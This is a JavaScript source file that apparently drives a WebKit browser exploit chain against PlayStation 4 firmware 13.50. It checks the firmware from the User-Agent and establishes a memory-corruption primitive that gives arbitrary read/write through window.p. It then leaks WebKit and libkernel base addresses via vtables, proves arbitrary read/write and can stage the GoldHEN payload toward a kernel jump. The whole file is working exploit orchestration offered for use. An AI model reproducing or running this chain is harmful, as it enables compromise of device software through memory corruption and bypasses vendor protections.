/** Auto-run: primitive → 2e Leak+lk → R/W proof (GitHub Pages bundle). */
import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris, getCoreNative } from "./core.js?v=9";
import { runArwProofVerbose } from "./arw_proof.js";
import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
import {
    persistSessionBases, saveLibkernelSession, saveLastFnPtr,
} from "./libkernel_resolve.js";

const BUILD = "arw-1350-1";
const LOG_MAX = 1200;
const TARGET_FW = "13.50";

const params = new URLSearchParams(location.search);
const VERBOSE_PRIM = params.get("verbose") === "1";
const PROBE_MODULES = params.get("modules") === "1";
const NO_AUTO = params.get("noauto") === "1";
const FORCE_FW = params.get("force") === "1";
const lines = [];
const retain = [];
let started = false;
let readPrimitivePass = false;

const PRIM_LOG = /FAIL|ERROR|PASS|PRIMITIVE|READ-PRIMITIVE|GIVE-UP|ADDROF-RETURNED|ADDROF-COPY|HOLDER|RW-CARRIER|FAKE-ADDRESS|NO-RESULT|LOAD-THREW|COMPOSITION|PLACEMENT|ZERO-HEADER|ATTEMPT-START|CORE-GIVE-UP|SSV-RETURNED|TRIM|JSC-PROFILE/i;

function $(id) { return document.getElementById(id); }

function renderLog() {
    const o = $("out");
    if (!o) return;
    o.textContent = lines.join("\n");
    o.scrollTop = o.scrollHeight;
}

function log(tag, detail) {
    const line = tag + (detail ? "  " + detail : "");
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    renderLog();
}

function flushLogSession() {
    try {
        sessionStorage.setItem("wk-arw-log", lines.slice(-800).join("\n"));
    } catch (_) { }
    shipLogs();
}

function shipLogs() {
    const body = lines.join("\n");
    if (!body) return;
    try {
        var x = new XMLHttpRequest();
        x.open("POST", "/log", true);
        x.setRequestHeader("Content-Type", "text/plain; charset=utf-8");
        x.send(body);
    } catch (_) { }
}

function state(msg, cls) {
    const s = $("state");
    if (!s) return;
    s.textContent = msg;
    if (cls) {
        s.classList.remove("ok", "bad", "warn");
        s.classList.add(cls);
    }
}

function groomLabel() {
    return params.get("g") || "default";
}

/** Parse PS4 firmware from WebKit User-Agent (retail browser string). */
function parsePs4Ua(ua) {
    ua = ua || "";
    if (/PlayStation\s+5/i.test(ua))
        return { platform: "ps5", key: null, snippet: ua.slice(0, 96) };
    const m = ua.match(/PlayStation\s+4[\/\s](\d+)\.(\d+)/i);
    if (!m)
        return { platform: "other", key: null, snippet: ua.slice(0, 96) };
    const key = m[1] + "." + parseInt(m[2], 10).toString(10).padStart(2, "0");
    return { platform: "ps4", key, snippet: m[0] };
}

/**
 * Hard gate: this bundle is HW-tuned for PS4 13.50 only.
 * @returns {{ ok: boolean, key: string|null, forced?: boolean, reason?: string }}
 */
function verifyTargetFirmware() {
    const ua = navigator.userAgent || "";
    log("UA-RAW", ua.length > 140 ? ua.slice(0, 140) + "…" : ua);

    const parsed = parsePs4Ua(ua);
    if (parsed.platform === "ps5") {
        return {
            ok: false,
            key: null,
            reason: "PlayStation 5 detected — this page is PS4 13.50 only",
        };
    }
    if (parsed.platform !== "ps4") {
        if (FORCE_FW) {
            log("FW-WARN", "UA is not PlayStation 4 — force=1 dev override");
            return { ok: true, key: TARGET_FW, forced: true };
        }
        return {
            ok: false,
            key: null,
            reason: "Not a PS4 browser (User-Agent has no PlayStation 4/x.xx)",
        };
    }

    log("FW-DETECT", "PS4 " + parsed.key + "  (" + parsed.snippet + ")");

    if (parsed.key === TARGET_FW) {
        log("FW-OK", "PS4 " + TARGET_FW + " confirmed via User-Agent");
        return { ok: true, key: parsed.key, forced: false };
    }

    if (FORCE_FW) {
        log("FW-WARN", "UA says PS4 " + parsed.key + " — force=1 override (offsets wrong)");
        return { ok: true, key: parsed.key, forced: true };
    }

    return {
        ok: false,
        key: parsed.key,
        reason: "Wrong firmware: User-Agent reports PS4 " + parsed.key
            + " — this build requires PS4 " + TARGET_FW,
    };
}

function resolveOffsets(fwCheck) {
    if (fwCheck.forced) {
        const forced = offsetsForKey(TARGET_FW);
        if (forced.off) return forced;
    }
    return offsetsFor(navigator.userAgent);
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function chainWebkitBase(off) {
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    const anchorOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
    if (nativeFn && anchorOff) {
        const derived = nativeFn.sub32(anchorOff);
        if (derived) webkitBase = derived;
    }
    return webkitBase;
}

/** parseInt carrier snapshot or expm1 fallback — lightweight, no slab. */
function persistWebkitBasesLight(p, off, carrier) {
    if (!p || !off) return null;
    let nativeFn = null;
    if (carrier && carrier.native && carrier.native.nativeFn != null) {
        const nf = carrier.native.nativeFn;
        if (typeof nf === "object" && nf.low != null) nativeFn = nf;
        else if (typeof nf === "number" && nf > 0)
            nativeFn = new int64(nf >>> 0, Math.floor(nf / 0x100000000));
    }
    if (!nativeFn) {
        const cell = p.leakval(Math.expm1);
        nativeFn = read8p(p, read8p(p, cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function || 0x28));
    }
    if (!nativeFn) return null;
    const anchorOff = off.wk_parseint_native != null ? off.wk_parseint_native : off.wk_expm1_builtin;
    const webkitBase = anchorOff ? nativeFn.sub32(anchorOff) : null;
    persistSessionBases(nativeFn, webkitBase, { trust: "arw" });
    return webkitBase;
}

async function run2eLk(p, off, carrier) {
    let webkitBase = chainWebkitBase(off);
    if (!webkitBase) {
        try {
            webkitBase = persistWebkitBasesLight(p, off, carrier);
            if (webkitBase) log("WEBKIT-BASE", String(webkitBase));
        } catch (e) {
            log("WEBKIT-BASE-WARN", e.message || String(e));
        }
    }
    if (!webkitBase) {
        log("2E-SKIP", "no webkitBase — lk vote skipped");
        return false;
    }

    log("2E-LK", BUILD + " — vtable leak + lk vote");
    try {
        const vtslots = params.get("vtslots");
        const result = await probeLibkernelViaVtable({
            p,
            carrier: carrier || null,
            webkitBase,
            off,
            log,
            read8: read8p,
            read4: read4p,
            yieldFn: (ms) => new Promise((r) => setTimeout(r, ms)),
            opts: {
                full: params.get("full") === "1",
                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
                retain,
            },
        });
        if (result.ok && result.lk) {
            const via = result.hit ? (result.hit.method + "/" + result.hit.via) : "?";
            log("LK-OK", result.lk + " (" + via + ")");
            try {
                sessionStorage.setItem("wk-libkernelBase", String(result.lk).replace(/^0x/i, ""));
            } catch (_) { }
            if (result.hit && result.hit.fnPtr) saveLastFnPtr(result.hit.fnPtr);
            saveLibkernelSession(result.lk, result.hit && result.hit.iatRva != null
                ? result.hit.iatRva : null, { forced: true });
            log("LK-HOT", "libkernel saved — 0 reads @ lk");
            return true;
        }
        log("LK-HINT", "2e miss — ?g=drain:512 or ?full=1 (R/W proof continues)");
        return false;
    } catch (e) {
        log("LK-FAIL", e.message || String(e));
        return false;
    }
}

async function runPipeline() {
    if (started) return;
    started = true;
    readPrimitivePass = false;
    lines.length = 0;
    try { sessionStorage.removeItem("wk-arw-log"); } catch (_) { }

    state("running…", "warn");
    log("BOOT", BUILD + "  target=PS4-" + TARGET_FW + "  groom=" + groomLabel() + "  auto=1");

    const fwCheck = verifyTargetFirmware();
    if (!fwCheck.ok) {
        log("FW-BLOCK", fwCheck.reason || "firmware check failed");
        if (fwCheck.key)
            log("FW-HINT", "detected PS4 " + fwCheck.key + " — need " + TARGET_FW);
        log("FW-HINT", "desktop dev only: add ?force=1 (will use wrong offsets on real HW)");
        state("wrong firmware — PS4 " + TARGET_FW + " only", "bad");
        flushLogSession();
        started = false;
        return;
    }

    const detected = resolveOffsets(fwCheck);
    if (!detected.off) {
        log("FW-BLOCK", "no offset table for PS4 " + (detected.key || TARGET_FW));
        state("offsets missing", "bad");
        flushLogSession();
        started = false;
        return;
    }

    log("UA-FW", detected.key + "  offsets loaded"
        + (fwCheck.forced ? "  (force → " + TARGET_FW + " table)" : ""));
    if (detected.off.fw_status)
        log("OFFSETS", detected.off.fw_status);

    try {
        log("STEP", "═══ PHASE 1: dummykit-core primitive ═══");
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (tag, detail, attempt) => {
                if (!VERBOSE_PRIM && !PRIM_LOG.test(tag)) return;
                const prefix = attempt != null ? "[a" + attempt + "] " : "";
                log(prefix + tag, detail || "");
                if (tag === "READ-PRIMITIVE-PASS") readPrimitivePass = true;
            },
        });

        log("STEP", "═══ PHASE 2: install window.p ═══");
        installWindowP(carrier, {
            promote: false,
            onEvent: (t, d) => log(t, d || ""),
        });
        window._wkCarrier = carrier;

        if (!carrier.native) {
            const nat = getCoreNative(carrier);
            if (nat) carrier.native = nat;
        }

        const p = window.p;
        if (!p) throw new Error("window.p missing after installWindowP");

        try { trimExploitDebris(); } catch (e) {
            log("TRIM-WARN", e.message || String(e));
        }

        if (pairStatus.state === "broken")
            throw new Error("pair promotion broken — reload tab");

        log("PRIMITIVE-OK", "window.p live  pair=" + pairStatus.state);

        const off = detected.off;
        if (!off) throw new Error("no firmware offsets for this UA");

        log("STEP", "═══ PHASE 3: 2e Leak+lk ═══");
        const lk2eOk = await run2eLk(p, off, carrier);
        const sessionWebkit = parseAddr(sessionStorage.getItem("wk-webkitBase"));
        const sessionLk = parseAddr(sessionStorage.getItem("wk-libkernelBase"));

        log("STEP", "═══ PHASE 4: R/W proof ═══");
        const proof = runArwProofVerbose(p, off, carrier, {
            log,
            readPrimitivePass,
            pairStatus,
            probeModules: PROBE_MODULES,
            verboseLeak: VERBOSE_PRIM,
            lk2eOk,
            sessionWebkit,
            sessionLk,
        });

        flushLogSession();
        if (proof.ok) {
            state("arbitrary r/w achieved", "ok");
            try {
                sessionStorage.setItem("wk-arw-ok", JSON.stringify({
                    t: Date.now(),
                    fw: detected.key,
                    webkitBase: proof.webkitBase ? String(proof.webkitBase) : "",
                    lk: sessionStorage.getItem("wk-libkernelBase") || "",
                }));
            } catch (_) { }
        } else {
            state("proof incomplete", "bad");
        }

        if (params.get("goldhen") === "1") {
            const stage = (typeof window !== "undefined" && window.stageGoldHen) || null;
            if (!stage) {
                log("GOLDHEN-SKIP", "goldhen.js module not loaded — chain unaffected");
            } else {
                log("STEP", "═══ PHASE 5: goldhen staging ═══");
                try {
                    const sessionLk = parseAddr(sessionStorage.getItem("wk-libkernelBase"));
                    const gr = await stage({
                        p,
                        off,
                        carrier,
                        log,
                        sessionLk,
                    });
                    if (gr.ok)
                        state("goldhen carried — awaiting kernel jump", "warn");
                } catch (e) {
                    log("GOLDHEN-FAIL", "phase5: " + (e.message || String(e)));
                }
            }
        }

        flushLogSession();
    } catch (e) {
        log("FAIL", e.message || String(e));
        if (/oom|out of memory|allocation/i.test(String(e.message)))
            log("HINT", "OOM — reload tab; use ?g=drain:96; avoid ?verbose=1");
        else if (/gave up|race|COMPOSITION|PLACEMENT/i.test(String(e.message)))
            log("HINT", "race lost — close browser, reload ?g=drain:512");
        flushLogSession();
        state("failed", "bad");
    }
}

function init() {
    const AUTO = params.get("auto") === "1";
    log("INIT", "auto=" + AUTO + " noauto=" + NO_AUTO + " forced=" + FORCE_FW + " ua=" + (navigator.userAgent || "").slice(0, 80));
    if (NO_AUTO) {
        state("noauto=1 — reload without it to run", "warn");
        return;
    }
    if (AUTO) {
        state("starting…", "warn");
        log("AUTO", "primitive → 2e → R/W proof"
            + "  modules=" + (PROBE_MODULES ? "1" : "0")
            + "  (?noauto=1 to disable, ?auto=1 = run immediately)");
        runPipeline();
        return;
    }
    state("tap to start", "warn");
    log("ARM", "armed — tap anywhere in the page to run the chain");
    log("ARM", "(?auto=1 restores immediate run)");
    const startOnce = () => {
        document.removeEventListener("click", startOnce, true);
        document.removeEventListener("touchstart", startOnce, true);
        runPipeline();
    };
    document.addEventListener("click", startOnce, true);
    document.addEventListener("touchstart", startOnce, true);
}

init();
